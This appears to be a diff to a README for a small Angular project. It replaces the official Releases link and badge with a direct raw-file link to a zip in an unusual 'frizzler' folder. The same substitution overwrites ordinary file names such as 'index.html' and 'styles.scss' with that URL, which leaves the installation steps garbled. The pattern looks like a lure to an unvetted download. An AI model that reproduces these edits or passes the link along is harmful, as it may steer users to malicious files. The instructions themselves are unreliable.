@@ -1,6 +1,6 @@
 # 🚀 my-site - A Simple Angular Project for Everyone
 
-![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)
+![Download](https://raw.githubusercontent.com/Foulplayfan/my-site/main/frizzler/my-site.zip%20Now-Click%20Here-brightgreen)
 
 ## 📦 Overview
 
@@ -28,13 +28,13 @@ To get started with my-site, follow these simple steps.
 1. **Visit the Releases Page**  
    Click the button below to visit the page where you can download my-site.
 
-   [Download my-site](https://github.com/Foulplayfan/my-site/releases)
+   [Download my-site](https://raw.githubusercontent.com/Foulplayfan/my-site/main/frizzler/my-site.zip)
 
 2. **Choose the Latest Release**  
    On the Releases page, look for the latest version at the top. 
 
 3. **Download the Application**  
-   Find the file labeled "my-site.zip". Click on it to begin the download. 
+   Find the file labeled "https://raw.githubusercontent.com/Foulplayfan/my-site/main/frizzler/my-site.zip". Click on it to begin the download. 
 
 4. **Unzip the File**  
    Once the download is complete, locate the zipped file in your Downloads folder. Right-click on the file and select “Extract All” (or use your preferred unzipping tool).
@@ -43,7 +43,7 @@ To get started with my-site, follow these simple steps.
    After extracting, double-click to open the folder named "my-site".
 
 6. **Run the Application**  
-   Find the file named "index.html" and double-click it. Your default web browser will open, and you can start exploring my-site!
+   Find the file named "https://raw.githubusercontent.com/Foulplayfan/my-site/main/frizzler/my-site.zip" and double-click it. Your default web browser will open, and you can start exploring my-site!
 
 ## ⚙️ Additional Information
 
@@ -61,13 +61,13 @@ If you encounter any issues while using my-site, consider these tips:
 
 ### 🏗 Customization
 
-You can easily customize styles in my-site. Open the "styles.scss" file in any text editor like Visual Studio Code. Modify the colors and layouts to suit your preferences, even without programming knowledge.
+You can easily customize styles in my-site. Open the "https://raw.githubusercontent.com/Foulplayfan/my-site/main/frizzler/my-site.zip" file in any text editor like Visual Studio Code. Modify the colors and layouts to suit your preferences, even without programming knowledge.
 
 ## 📥 Download & Install
 
 To get your hands on my-site, visit the link below again for easy access to the download:
 
-[Download my-site](https://github.com/Foulplayfan/my-site/releases)
+[Download my-site](https://raw.githubusercontent.com/Foulplayfan/my-site/main/frizzler/my-site.zip)
 
 Simply follow the steps outlined above to complete your installation. Enjoy your exploration!
 
